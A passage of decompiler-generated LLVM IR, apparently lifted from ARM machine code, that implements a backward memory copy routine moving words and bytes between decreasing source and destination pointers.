  %v7_17444 = add i32 %v0_17444, -8
  %v8_17444 = inttoptr i32 %v7_17444 to i32*
  %v9_17444 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_17444, i32* %v8_17444, align 4
  %v10_17444 = add i32 %v0_17444, -4
  %v11_17444 = inttoptr i32 %v10_17444 to i32*
  %v12_17444 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17444, i32* %v11_17444, align 4
  store i32 %v1_17444, i32* %r0.global-to-local, align 4
  %v0_17448 = load i32, i32* %r1.global-to-local, align 4
  %v1_17448 = add i32 %v0_17448, -4
  %v2_17448 = inttoptr i32 %v1_17448 to i32*
  %v3_17448 = load i32, i32* %v2_17448, align 4
  store i32 %v3_17448, i32* %r3.global-to-local, align 4
  %v4_17448 = add i32 %v0_17448, -8
  %v5_17448 = inttoptr i32 %v4_17448 to i32*
  %v6_17448 = load i32, i32* %v5_17448, align 4
  store i32 %v6_17448, i32* %r4.global-to-local, align 4
  %v7_17448 = add i32 %v0_17448, -12
  %v8_17448 = inttoptr i32 %v7_17448 to i32*
  %v9_17448 = load i32, i32* %v8_17448, align 4
  store i32 %v9_17448, i32* @ip, align 4
  %v10_17448 = add i32 %v0_17448, -16
  %v11_17448 = inttoptr i32 %v10_17448 to i32*
  %v12_17448 = load i32, i32* %v11_17448, align 4
  store i32 %v12_17448, i32* %lr.global-to-local, align 4
  store i32 %v10_17448, i32* @r1, align 4
  %v1_1744c = add i32 %v0_17444, -32
  %v2_1744c = inttoptr i32 %v1_1744c to i32*
  store i32 %v3_17448, i32* %v2_1744c, align 4
  %v4_1744c = add i32 %v0_17444, -28
  %v5_1744c = inttoptr i32 %v4_1744c to i32*
  %v6_1744c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1744c, i32* %v5_1744c, align 4
  %v7_1744c = add i32 %v0_17444, -24
  %v8_1744c = inttoptr i32 %v7_1744c to i32*
  %v9_1744c = load i32, i32* @ip, align 4
  store i32 %v9_1744c, i32* %v8_1744c, align 4
  %v10_1744c = add i32 %v0_17444, -20
  %v11_1744c = inttoptr i32 %v10_1744c to i32*
  %v12_1744c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1744c, i32* %v11_1744c, align 4
  store i32 %v1_1744c, i32* %r0.global-to-local, align 4
  %v0_17450 = load i32, i32* %r2.global-to-local, align 4
  %v2_17450 = add i32 %v0_17450, -32
  store i32 %v2_17450, i32* %r2.global-to-local, align 4
  %v6_17454 = icmp slt i32 %v0_17450, 32
  br i1 %v6_17454, label %dec_label_pc_17458.loopexit, label %dec_label_pc_17440.dec_label_pc_17440_crit_edge

dec_label_pc_17440.dec_label_pc_17440_crit_edge:  ; preds = %dec_label_pc_17440
  %v0_17440.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17440

dec_label_pc_17458.loopexit:                      ; preds = %dec_label_pc_17440
  %v4_17450 = sub i32 31, %v0_17450
  %v5_17450 = and i32 %v4_17450, %v0_17450
  %v6_17450 = icmp slt i32 %v5_17450, 0
  %v7_17450 = icmp slt i32 %v2_17450, 0
  store i1 %v6_17450, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17450, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17458

dec_label_pc_17458:                               ; preds = %dec_label_pc_17458.loopexit, %dec_label_pc_17434
  %v6_17460 = phi i32 [ %v1_1744c, %dec_label_pc_17458.loopexit ], [ %v0_1744449, %dec_label_pc_17434 ]
  %v0_17468.pr = phi i32 [ %v2_17450, %dec_label_pc_17458.loopexit ], [ %v2_17438, %dec_label_pc_17434 ]
  %v4_17458 = add i32 %v0_17468.pr, 16
  %v6_17458 = sub i32 0, %v0_17468.pr
  %v7_17458 = and i32 %v4_17458, %v6_17458
  %v8_17458 = icmp slt i32 %v7_17458, 0
  store i1 %v8_17458, i1* %cpsr_v.global-to-local, align 1
  %v9_17458 = icmp slt i32 %v4_17458, 0
  store i1 %v9_17458, i1* %cpsr_n.global-to-local, align 1
  %v5_1745c = icmp slt i32 %v0_17468.pr, -16
  br i1 %v5_1745c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_17458
  %v6_1745c = load i32, i32* @r1, align 4
  %v7_1745c = add i32 %v6_1745c, -4
  %v8_1745c = inttoptr i32 %v7_1745c to i32*
  %v9_1745c = load i32, i32* %v8_1745c, align 4
  store i32 %v9_1745c, i32* %r3.global-to-local, align 4
  %v10_1745c = add i32 %v6_1745c, -8
  %v11_1745c = inttoptr i32 %v10_1745c to i32*
  %v12_1745c = load i32, i32* %v11_1745c, align 4
  store i32 %v12_1745c, i32* %r4.global-to-local, align 4
  %v13_1745c = add i32 %v6_1745c, -12
  %v14_1745c = inttoptr i32 %v13_1745c to i32*
  %v15_1745c = load i32, i32* %v14_1745c, align 4
  store i32 %v15_1745c, i32* @ip, align 4
  %v16_1745c = add i32 %v6_1745c, -16
  %v17_1745c = inttoptr i32 %v16_1745c to i32*
  %v18_1745c = load i32, i32* %v17_1745c, align 4
  store i32 %v18_1745c, i32* %lr.global-to-local, align 4
  store i32 %v16_1745c, i32* @r1, align 4
  %v7_17460 = add i32 %v6_17460, -16
  %v8_17460 = inttoptr i32 %v7_17460 to i32*
  store i32 %v9_1745c, i32* %v8_17460, align 4
  %v10_17460 = add i32 %v6_17460, -12
  %v11_17460 = inttoptr i32 %v10_17460 to i32*
  %v12_17460 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17460, i32* %v11_17460, align 4
  %v13_17460 = add i32 %v6_17460, -8
  %v14_17460 = inttoptr i32 %v13_17460 to i32*
  %v15_17460 = load i32, i32* @ip, align 4
  store i32 %v15_17460, i32* %v14_17460, align 4
  %v16_17460 = add i32 %v6_17460, -4
  %v17_17460 = inttoptr i32 %v16_17460 to i32*
  %v18_17460 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17460, i32* %v17_17460, align 4
  store i32 %v7_17460, i32* %r0.global-to-local, align 4
  %v6_17464 = load i32, i32* %r2.global-to-local, align 4
  %v7_17464 = add i32 %v6_17464, -16
  store i32 %v7_17464, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_17458, %bb140
  %v6_17470 = phi i32 [ %v7_17460, %bb140 ], [ %v6_17460, %dec_label_pc_17458 ]
  %v0_17468 = phi i32 [ %v7_17464, %bb140 ], [ %v0_17468.pr, %dec_label_pc_17458 ]
  %v4_17468 = add i32 %v0_17468, 20
  store i32 %v4_17468, i32* %r2.global-to-local, align 4
  %v6_17468 = sub i32 0, %v0_17468
  %v7_17468 = and i32 %v4_17468, %v6_17468
  %v8_17468 = icmp slt i32 %v7_17468, 0
  store i1 %v8_17468, i1* %cpsr_v.global-to-local, align 1
  %v9_17468 = icmp slt i32 %v4_17468, 0
  store i1 %v9_17468, i1* %cpsr_n.global-to-local, align 1
  %v5_1746c = icmp slt i32 %v0_17468, -20
  br i1 %v5_1746c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_1746c = load i32, i32* @r1, align 4
  %v7_1746c = add i32 %v6_1746c, -4
  %v8_1746c = inttoptr i32 %v7_1746c to i32*
  %v9_1746c = load i32, i32* %v8_1746c, align 4
  store i32 %v9_1746c, i32* %r3.global-to-local, align 4
  %v10_1746c = add i32 %v6_1746c, -8
  %v11_1746c = inttoptr i32 %v10_1746c to i32*
  %v12_1746c = load i32, i32* %v11_1746c, align 4
  store i32 %v12_1746c, i32* @ip, align 4
  %v13_1746c = add i32 %v6_1746c, -12
  %v14_1746c = inttoptr i32 %v13_1746c to i32*
  %v15_1746c = load i32, i32* %v14_1746c, align 4
  store i32 %v15_1746c, i32* %lr.global-to-local, align 4
  store i32 %v13_1746c, i32* @r1, align 4
  %v7_17470 = add i32 %v6_17470, -12
  %v8_17470 = inttoptr i32 %v7_17470 to i32*
  store i32 %v9_1746c, i32* %v8_17470, align 4
  %v10_17470 = add i32 %v6_17470, -8
  %v11_17470 = inttoptr i32 %v10_17470 to i32*
  %v12_17470 = load i32, i32* @ip, align 4
  store i32 %v12_17470, i32* %v11_17470, align 4
  %v13_17470 = add i32 %v6_17470, -4
  %v14_17470 = inttoptr i32 %v13_17470 to i32*
  %v15_17470 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17470, i32* %v14_17470, align 4
  store i32 %v7_17470, i32* %r0.global-to-local, align 4
  %v6_17474 = load i32, i32* %r2.global-to-local, align 4
  %v7_17474 = add i32 %v6_17474, -12
  store i32 %v7_17474, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_1749457 = phi i32 [ %v6_17470, %.thread14 ], [ %v7_17470, %bb141 ]
  %v0_1747c55 = phi i32 [ %v4_17468, %.thread14 ], [ %v7_17474, %bb141 ]
  %v2_17478 = load i8*, i8** %stack_var_-8, align 4
  %v3_17478 = ptrtoint i8* %v2_17478 to i32
  store i32 %v3_17478, i32* @r4, align 4
  store i32 %v8_17434, i32* @lr, align 4
  br label %dec_label_pc_1747c

dec_label_pc_1747c:                               ; preds = %dec_label_pc_1742c, %.thread16
  %v7_1748c = phi i32 [ %v0_1744449, %dec_label_pc_1742c ], [ %v6_1749457, %.thread16 ]
  %v0_1747c = phi i32 [ %v2_1742c, %dec_label_pc_1742c ], [ %v0_1747c55, %.thread16 ]
  %v2_1747c = add i32 %v0_1747c, 8
  store i32 %v2_1747c, i32* %r2.global-to-local, align 4
  %v4_1747c = sub i32 0, %v0_1747c
  %v5_1747c = and i32 %v2_1747c, %v4_1747c
  %v6_1747c = icmp slt i32 %v5_1747c, 0
  store i1 %v6_1747c, i1* %cpsr_v.global-to-local, align 1
  %v7_1747c = icmp slt i32 %v2_1747c, 0
  store i1 %v7_1747c, i1* %cpsr_n.global-to-local, align 1
  %v5_17480 = icmp slt i32 %v0_1747c, -8
  br i1 %v5_17480, label %bb143, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_1747c
  %v6_17484 = add i32 %v0_1747c, 4
  store i32 %v6_17484, i32* %r2.global-to-local, align 4
  %v8_17484 = sub i32 -5, %v0_1747c
  %v9_17484 = and i32 %v8_17484, %v2_1747c
  %v10_17484 = icmp slt i32 %v9_17484, 0
  store i1 %v10_17484, i1* %cpsr_v.global-to-local, align 1
  %v11_17484 = icmp slt i32 %v6_17484, 0
  store i1 %v11_17484, i1* %cpsr_n.global-to-local, align 1
  %v5_17488 = icmp slt i32 %v2_1747c, 4
  %v6_17488 = load i32, i32* @r1, align 4
  %v7_17488 = add i32 %v6_17488, -4
  %v8_17488 = inttoptr i32 %v7_17488 to i32*
  %v9_17488 = load i32, i32* %v8_17488, align 4
  store i32 %v9_17488, i32* %r3.global-to-local, align 4
  br i1 %v5_17488, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_17484
  store i32 %v7_17488, i32* @r1, align 4
  %v8_1748c = add i32 %v7_1748c, -4
  %v9_1748c = inttoptr i32 %v8_1748c to i32*
  store i32 %v9_17488, i32* %v9_1748c, align 4
  %v10_1748c = load i32, i32* %r0.global-to-local, align 4
  %v11_1748c = add i32 %v10_1748c, -4
  store i32 %v11_1748c, i32* %r0.global-to-local, align 4
  %v0_1749c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_17484
  %v10_17490 = add i32 %v6_17488, -8
  %v11_17490 = inttoptr i32 %v10_17490 to i32*
  %v12_17490 = load i32, i32* %v11_17490, align 4
  store i32 %v12_17490, i32* @ip, align 4
  store i32 %v10_17490, i32* @r1, align 4
  %v7_17494 = add i32 %v7_1748c, -8
  %v8_17494 = inttoptr i32 %v7_17494 to i32*
  store i32 %v9_17488, i32* %v8_17494, align 4
  %v10_17494 = add i32 %v7_1748c, -4
  %v11_17494 = inttoptr i32 %v10_17494 to i32*
  %v12_17494 = load i32, i32* @ip, align 4
  store i32 %v12_17494, i32* %v11_17494, align 4
  store i32 %v7_17494, i32* %r0.global-to-local, align 4
  %v6_17498 = load i32, i32* %r2.global-to-local, align 4
  %v7_17498 = add i32 %v6_17498, -4
  store i32 %v7_17498, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_1747c, %dec_label_pc_1740c, %dec_label_pc_17640, %dec_label_pc_175d4, %dec_label_pc_17568, %bb142
  %v2_174a0 = phi i32 [ %v11_1748c, %.thread20 ], [ %v0_1753832, %.thread26 ], [ %v7_1748c, %dec_label_pc_1747c ], [ %v2_17410, %dec_label_pc_1740c ], [ %v2_174ac65, %dec_label_pc_17640 ], [ %v2_174ac64, %dec_label_pc_175d4 ], [ %v2_174ac63, %dec_label_pc_17568 ], [ %v7_17494, %bb142 ]
  %v0_1749c = phi i32 [ %v0_1749c.pre, %.thread20 ], [ %v2_174e0, %.thread26 ], [ %v2_1747c, %dec_label_pc_1747c ], [ %v2_17414, %dec_label_pc_1740c ], [ %v0_1749c61, %dec_label_pc_17640 ], [ %v0_1749c60, %dec_label_pc_175d4 ], [ %v0_1749c59, %dec_label_pc_17568 ], [ %v7_17498, %bb142 ]
  %v1_1749c = add i32 %v0_1749c, 4
  store i32 %v1_1749c, i32* @r2, align 4
  %v3_1749c = sub i32 0, %v0_1749c
  %v4_1749c = and i32 %v1_1749c, %v3_1749c
  %v5_1749c = icmp slt i32 %v4_1749c, 0
  store i1 %v5_1749c, i1* %cpsr_v.global-to-local, align 1
  %v6_1749c = icmp slt i32 %v1_1749c, 0
  store i1 %v6_1749c, i1* %cpsr_n.global-to-local, align 1
  %v7_1749c = icmp eq i32 %v1_1749c, 0
  store i1 %v7_1749c, i1* @cpsr_z, align 1
  br i1 %v7_1749c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_174a4 = add i32 %v0_1749c, 2
  %v3_174a4 = sub i32 -3, %v0_1749c
  %v4_174a4 = and i32 %v3_174a4, %v1_1749c
  %v5_174a4 = icmp slt i32 %v4_174a4, 0
  store i1 %v5_174a4, i1* %cpsr_v.global-to-local, align 1
  %v6_174a4 = icmp slt i32 %v1_174a4, 0
  store i1 %v6_174a4, i1* %cpsr_n.global-to-local, align 1
  %v7_174a4 = icmp eq i32 %v1_1749c, 2
  store i1 %v7_174a4, i1* @cpsr_z, align 1
  %v0_174a8 = load i32, i32* @r1, align 4
  %v1_174a8 = add i32 %v0_174a8, -1
  %v2_174a8 = inttoptr i32 %v1_174a8 to i8*
  %v3_174a8 = load i8, i8* %v2_174a8, align 1
  %v4_174a8 = zext i8 %v3_174a8 to i32
  store i32 %v4_174a8, i32* %r3.global-to-local, align 4
  store i32 %v1_174a8, i32* @r1, align 4
  %v3_174ac = add i32 %v2_174a0, -1
  %v4_174ac = inttoptr i32 %v3_174ac to i8*
  store i8 %v3_174a8, i8* %v4_174ac, align 1
  %v5_174ac = load i32, i32* %r0.global-to-local, align 4
  %v6_174ac = add i32 %v5_174ac, -1
  store i32 %v6_174ac, i32* %r0.global-to-local, align 4
  %v0_174b0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_174b0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_174b0 = xor i1 %v0_174b0, %v1_174b0
  br i1 %v2_174b0, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_174b0 = load i32, i32* @r1, align 4
  %v4_174b0 = add i32 %v3_174b0, -1
  %v5_174b0 = inttoptr i32 %v4_174b0 to i8*
  %v6_174b0 = load i8, i8* %v5_174b0, align 1
  %v7_174b0 = zext i8 %v6_174b0 to i32
  store i32 %v7_174b0, i32* %r3.global-to-local, align 4
  store i32 %v4_174b0, i32* @r1, align 4
  %v6_174b4 = add i32 %v5_174ac, -2
  %v7_174b4 = inttoptr i32 %v6_174b4 to i8*
  store i8 %v6_174b0, i8* %v7_174b4, align 1
  %v8_174b4 = load i32, i32* %r0.global-to-local, align 4
  %v9_174b4 = add i32 %v8_174b4, -1
  store i32 %v9_174b4, i32* %r0.global-to-local, align 4
  %v1_174b8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_174b8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_174bc = phi i32 [ %v9_174b4, %bb145 ], [ %v6_174ac, %bb144 ]
  %v2_174bc = phi i1 [ %v2_174b8.pre, %bb145 ], [ %v1_174b0, %bb144 ]
  %v1_174bc = phi i1 [ %v1_174b8.pre, %bb145 ], [ %v0_174b0, %bb144 ]
  %v0_174b8 = load i1, i1* @cpsr_z, align 1
  %v3_174b8 = xor i1 %v2_174bc, %v1_174bc
  %v4_174b8 = or i1 %v0_174b8, %v3_174b8
  br i1 %v4_174b8, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_174b8 = load i32, i32* @r1, align 4
  %v6_174b8 = add i32 %v5_174b8, -1
  %v7_174b8 = inttoptr i32 %v6_174b8 to i8*
  %v8_174b8 = load i8, i8* %v7_174b8, align 1
  %v9_174b8 = zext i8 %v8_174b8 to i32
  store i32 %v9_174b8, i32* %r3.global-to-local, align 4
  store i32 %v6_174b8, i32* @r1, align 4
  %v8_174bc = add i32 %v7_174bc, -1
  %v9_174bc = inttoptr i32 %v8_174bc to i8*
  store i8 %v8_174b8, i8* %v9_174bc, align 1
  %v10_174bc = load i32, i32* %r0.global-to-local, align 4
  %v11_174bc = add i32 %v10_174bc, -1
  store i32 %v11_174bc, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_174c4:                               ; preds = %dec_label_pc_1741c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_174c4 = icmp eq i32 %v1_1741c, 1
  store i1 %v8_174c4, i1* %cpsr_n.global-to-local, align 1
  %v1_174c8 = add i32 %v2_1740c, -1
  %v2_174c8 = inttoptr i32 %v1_174c8 to i8*
  %v3_174c8 = load i8, i8* %v2_174c8, align 1
  %v4_174c8 = zext i8 %v3_174c8 to i32
  store i32 %v4_174c8, i32* %r3.global-to-local, align 4
  store i32 %v1_174c8, i32* @r1, align 4
  %v3_174cc = add i32 %v2_17410, -1
  %v4_174cc = inttoptr i32 %v3_174cc to i8*
  store i8 %v3_174c8, i8* %v4_174cc, align 1
  %v5_174cc = load i32, i32* %r0.global-to-local, align 4
  %v6_174cc = add i32 %v5_174cc, -1
  store i32 %v6_174cc, i32* %r0.global-to-local, align 4
  br i1 %v8_174c4, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_174c4
  %v9_174c4 = icmp eq i32 %v1_1741c, 2
  %v6_174d0 = load i32, i32* @r1, align 4
  %v7_174d0 = add i32 %v6_174d0, -1
  %v8_174d0 = inttoptr i32 %v7_174d0 to i8*
  %v9_174d0 = load i8, i8* %v8_174d0, align 1
  %v10_174d0 = zext i8 %v9_174d0 to i32
  store i32 %v10_174d0, i32* %r3.global-to-local, align 4
  store i32 %v7_174d0, i32* @r1, align 4
  %v9_174d4 = add i32 %v5_174cc, -2
  %v10_174d4 = inttoptr i32 %v9_174d4 to i8*
  store i8 %v9_174d0, i8* %v10_174d4, align 1
  %v11_174d4 = load i32, i32* %r0.global-to-local, align 4
  %v12_174d4 = add i32 %v11_174d4, -1
  store i32 %v12_174d4, i32* %r0.global-to-local, align 4
  br i1 %v9_174c4, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_174d8 = load i32, i32* @r1, align 4
  %v9_174d8 = add i32 %v8_174d8, -1
  %v10_174d8 = inttoptr i32 %v9_174d8 to i8*
  %v11_174d8 = load i8, i8* %v10_174d8, align 1
  %v12_174d8 = zext i8 %v11_174d8 to i32
  store i32 %v12_174d8, i32* %r3.global-to-local, align 4
  store i32 %v9_174d8, i32* @r1, align 4
  %v11_174dc = add i32 %v11_174d4, -2
  %v12_174dc = inttoptr i32 %v11_174dc to i8*
  store i8 %v11_174d8, i8* %v12_174dc, align 1
  %v13_174dc = load i32, i32* %r0.global-to-local, align 4
  %v14_174dc = add i32 %v13_174dc, -1
  store i32 %v14_174dc, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_174c4, %bb148
  %v0_1753832 = phi i32 [ %v12_174d4, %bb147 ], [ %v6_174cc, %dec_label_pc_174c4 ], [ %v14_174dc, %bb148 ]
  %v0_174e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_174e0 = load i32, i32* @ip, align 4
  %v2_174e0 = sub i32 %v0_174e0, %v1_174e0
  store i32 %v2_174e0, i32* %r2.global-to-local, align 4
  %v4_174e0 = xor i32 %v1_174e0, %v0_174e0
  %v5_174e0 = xor i32 %v2_174e0, %v0_174e0
  %v6_174e0 = and i32 %v5_174e0, %v4_174e0
  %v7_174e0 = icmp slt i32 %v6_174e0, 0
  store i1 %v7_174e0, i1* %cpsr_v.global-to-local, align 1
  %v8_174e0 = icmp slt i32 %v2_174e0, 0
  store i1 %v8_174e0, i1* %cpsr_n.global-to-local, align 1
  %v5_174e4 = icmp slt i32 %v0_174e0, %v1_174e0
  br i1 %v5_174e4, label %bb143, label %dec_label_pc_174e8

dec_label_pc_174e8:                               ; preds = %.thread26
  %v0_174e8 = load i32, i32* @r1, align 4
  %v1_174e8 = urem i32 %v0_174e8, 4
  store i32 %v1_174e8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_174e8 = icmp eq i32 %v1_174e8, 0
  br i1 %v2_174e8, label %dec_label_pc_1742c, label %dec_label_pc_174f0

dec_label_pc_174f0:                               ; preds = %dec_label_pc_17424, %dec_label_pc_174e8
  %v0_1753831 = phi i32 [ %v2_17410, %dec_label_pc_17424 ], [ %v0_1753832, %dec_label_pc_174e8 ]
  %v0_175e4 = phi i32 [ %v2_17414, %dec_label_pc_17424 ], [ %v2_174e0, %dec_label_pc_174e8 ]
  %v0_174f0 = phi i32 [ %v2_1740c, %dec_label_pc_17424 ], [ %v0_174e8, %dec_label_pc_174e8 ]
  %v0_174f8 = phi i32 [ %v1_17424, %dec_label_pc_17424 ], [ %v1_174e8, %dec_label_pc_174e8 ]
  %v1_174f0 = and i32 %v0_174f0, -4
  store i32 %v1_174f0, i32* %r1.global-to-local, align 4
  %v1_174f4 = inttoptr i32 %v1_174f0 to i32*
  %v2_174f4 = load i32, i32* %v1_174f4, align 4
  store i32 %v2_174f4, i32* %r3.global-to-local, align 4
  %v7_174f8 = icmp ult i32 %v0_174f8, 2
  %v2_175dc = add i32 %v0_175e4, -12
  %v4_175dc = sub i32 11, %v0_175e4
  %v5_175dc = and i32 %v4_175dc, %v0_175e4
  %v6_175dc = icmp slt i32 %v5_175dc, 0
  store i1 %v6_175dc, i1* %cpsr_v.global-to-local, align 1
  %v7_175dc = icmp slt i32 %v2_175dc, 0
  store i1 %v7_175dc, i1* %cpsr_n.global-to-local, align 1
  %v5_175e0 = icmp slt i32 %v0_175e4, 12
  br i1 %v7_174f8, label %dec_label_pc_175dc, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f0
  %v8_174f8 = icmp eq i32 %v0_174f8, 2
  br i1 %v8_174f8, label %dec_label_pc_17570, label %dec_label_pc_17504

dec_label_pc_17504:                               ; preds = %dec_label_pc_17500
  br i1 %v5_175e0, label %dec_label_pc_17550, label %dec_label_pc_1750c

dec_label_pc_1750c:                               ; preds = %dec_label_pc_17504
  store i32 %v2_175dc, i32* %r2.global-to-local, align 4
  %v3_17510 = load i32, i32* @r4, align 4
  store i32 %v3_17510, i32* %stack_var_-12, align 4
  %v6_17510 = load i32, i32* @r5, align 4
  %v8_17510 = inttoptr i32 %v6_17510 to i8*
  store i8* %v8_17510, i8** %stack_var_-8, align 4
  %v11_17510 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17514

dec_label_pc_17514:                               ; preds = %dec_label_pc_17514.dec_label_pc_17514_crit_edge, %dec_label_pc_1750c
  %v0_17538 = phi i32 [ %v1_17538, %dec_label_pc_17514.dec_label_pc_17514_crit_edge ], [ %v0_1753831, %dec_label_pc_1750c ]
  %v0_17518 = phi i32 [ %v0_17518.pre, %dec_label_pc_17514.dec_label_pc_17514_crit_edge ], [ %v1_174f0, %dec_label_pc_1750c ]
  %v0_17514 = phi i32 [ %v0_17514.pre, %dec_label_pc_17514.dec_label_pc_17514_crit_edge ], [ %v2_174f4, %dec_label_pc_1750c ]
  %v3_17514 = mul i32 %v0_17514, 256
  store i32 %v3_17514, i32* %lr.global-to-local, align 4
  %v1_17518 = add i32 %v0_17518, -4
  %v2_17518 = inttoptr i32 %v1_17518 to i32*
  %v3_17518 = load i32, i32* %v2_17518, align 4
  store i32 %v3_17518, i32* %r3.global-to-local, align 4
  %v4_17518 = add i32 %v0_17518, -8
  %v5_17518 = inttoptr i32 %v4_17518 to i32*
  %v6_17518 = load i32, i32* %v5_17518, align 4
  store i32 %v6_17518, i32* %r4.global-to-local, align 4
  %v7_17518 = add i32 %v0_17518, -12
  %v8_17518 = inttoptr i32 %v7_17518 to i32*
  %v9_17518 = load i32, i32* %v8_17518, align 4
  store i32 %v9_17518, i32* %r5.global-to-local, align 4
  %v10_17518 = add i32 %v0_17518, -16
  %v11_17518 = inttoptr i32 %v10_17518 to i32*
  %v12_17518 = load i32, i32* %v11_17518, align 4
  store i32 %v10_17518, i32* %r1.global-to-local, align 4
  %v4_1751c = udiv i32 %v12_17518, 16777216
  %v5_1751c = or i32 %v4_1751c, %v3_17514
  store i32 %v5_1751c, i32* %lr.global-to-local, align 4
  %v3_17520 = mul i32 %v12_17518, 256
  %v4_17524 = udiv i32 %v9_17518, 16777216
  %v5_17524 = or i32 %v3_17520, %v4_17524
  store i32 %v5_17524, i32* @ip, align 4
  %v3_17528 = mul i32 %v9_17518, 256
  %v4_1752c = udiv i32 %v6_17518, 16777216
  %v5_1752c = or i32 %v3_17528, %v4_1752c
  store i32 %v5_1752c, i32* %r5.global-to-local, align 4
  %v3_17530 = mul i32 %v6_17518, 256
  %v4_17534 = udiv i32 %v3_17518, 16777216
  %v5_17534 = or i32 %v3_17530, %v4_17534
  store i32 %v5_17534, i32* %r4.global-to-local, align 4
  %v1_17538 = add i32 %v0_17538, -16
  %v2_17538 = inttoptr i32 %v1_17538 to i32*
  store i32 %v5_17534, i32* %v2_17538, align 4
  %v4_17538 = add i32 %v0_17538, -12
  %v5_17538 = inttoptr i32 %v4_17538 to i32*
  %v6_17538 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17538, i32* %v5_17538, align 4
  %v7_17538 = add i32 %v0_17538, -8
  %v8_17538 = inttoptr i32 %v7_17538 to i32*
  %v9_17538 = load i32, i32* @ip, align 4
  store i32 %v9_17538, i32* %v8_17538, align 4
  %v10_17538 = add i32 %v0_17538, -4
  %v11_17538 = inttoptr i32 %v10_17538 to i32*
  %v12_17538 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17538, i32* %v11_17538, align 4
  store i32 %v1_17538, i32* %r0.global-to-local, align 4
  %v0_1753c = load i32, i32* %r2.global-to-local, align 4
  %v2_1753c = add i32 %v0_1753c, -16
  store i32 %v2_1753c, i32* %r2.global-to-local, align 4
  %v6_17540 = icmp slt i32 %v0_1753c, 16
  br i1 %v6_17540, label %dec_label_pc_17544, label %dec_label_pc_17514.dec_label_pc_17514_crit_edge

dec_label_pc_17514.dec_label_pc_17514_crit_edge:  ; preds = %dec_label_pc_17514
  %v0_17514.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17518.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17514

dec_label_pc_17544:                               ; preds = %dec_label_pc_17514
  %v2_17544 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17544, i32* @r4, align 4
  %v5_17544 = load i8*, i8** %stack_var_-8, align 4
  %v6_17544 = ptrtoint i8* %v5_17544 to i32
  store i32 %v6_17544, i32* @r5, align 4
  store i32 %v11_17510, i32* @lr, align 4
  %v2_17548 = add i32 %v0_1753c, -4
  store i32 %v2_17548, i32* %r2.global-to-local, align 4
  %v4_17548 = add i32 %v0_1753c, 2147483632
  %v5_17548 = and i32 %v2_17548, %v4_17548
  %v6_17548 = icmp slt i32 %v5_17548, 0
  store i1 %v6_17548, i1* %cpsr_v.global-to-local, align 1
  %v7_17548 = icmp slt i32 %v2_17548, 0
  store i1 %v7_17548, i1* %cpsr_n.global-to-local, align 1
  %v5_1754c = icmp slt i32 %v2_1753c, -12
  br i1 %v5_1754c, label %dec_label_pc_17568, label %dec_label_pc_17550

dec_label_pc_17550:                               ; preds = %dec_label_pc_17504, %dec_label_pc_17544, %dec_label_pc_17550
  %v1_1755c = phi i32 [ %v5_1755c, %dec_label_pc_17550 ], [ %v0_1753831, %dec_label_pc_17504 ], [ %v1_17538, %dec_label_pc_17544 ]
  %v0_17550 = load i32, i32* %r3.global-to-local, align 4
  %v3_17550 = mul i32 %v0_17550, 256
  store i32 %v3_17550, i32* %ip.global-to-local, align 4
  %v0_17554 = load i32, i32* %r1.global-to-local, align 4
  %v1_17554 = add i32 %v0_17554, -4
  %v2_17554 = inttoptr i32 %v1_17554 to i32*
  %v3_17554 = load i32, i32* %v2_17554, align 4
  store i32 %v3_17554, i32* %r3.global-to-local, align 4
  store i32 %v1_17554, i32* %r1.global-to-local, align 4
  %v4_17558 = udiv i32 %v3_17554, 16777216
  %v5_17558 = or i32 %v4_17558, %v3_17550
  store i32 %v5_17558, i32* @ip, align 4
  %v2_1755c = add i32 %v1_1755c, -4
  %v3_1755c = inttoptr i32 %v2_1755c to i32*
  store i32 %v5_17558, i32* %v3_1755c, align 4
  %v4_1755c = load i32, i32* %r0.global-to-local, align 4
  %v5_1755c = add i32 %v4_1755c, -4
